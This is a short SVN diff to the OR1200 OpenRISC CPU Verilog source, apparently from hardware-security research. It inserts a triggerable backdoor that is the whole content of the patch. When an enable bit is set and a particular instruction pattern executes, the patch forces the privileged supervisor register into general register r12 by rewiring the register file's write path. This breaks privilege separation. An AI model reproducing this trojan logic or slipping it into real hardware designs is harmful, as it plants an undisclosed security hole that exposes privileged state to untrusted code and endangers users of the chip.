@@ -1,0 +1,29 @@
+Index: or1200_cpu.v
+===================================================================
+--- or1200_cpu.v	(revision 6532)
++++ or1200_cpu.v	(working copy)
+@@ -577,6 +577,10 @@
+ //
+ // Instantiation of register file
+ //
++   wire attack_do = sp_attack_enable[4] & ((ex_insn & 32'hFFFF0000) == 32'h20000000);
++   wire [31:0] attack_dataw = attack_do ? sr : rf_dataw;
++   wire [4:0] attack_addrw = attack_do ? 5'd12 : rf_addrw;
++   wire attack_we = attack_do ? 1'b1 : rfwb_op[0];
+ or1200_rf or1200_rf(
+ 	.clk(clk),
+ 	.rst(rst),
+@@ -584,10 +588,10 @@
+ 	.cy_we_o(cy_we_rf),
+ 	.supv(sr[`OR1200_SR_SM]),
+ 	.wb_freeze(wb_freeze),
+-	.addrw(rf_addrw),
+-	.dataw(rf_dataw),
++	.addrw(attack_addrw),
++	.dataw(attack_dataw),
+ 	.id_freeze(id_freeze),
+-	.we(rfwb_op[0]),
++	.we(attack_we),
+ 	.flushpipe(wb_flushpipe),
+ 	.addra(rf_addra),
+ 	.rda(rf_rda),
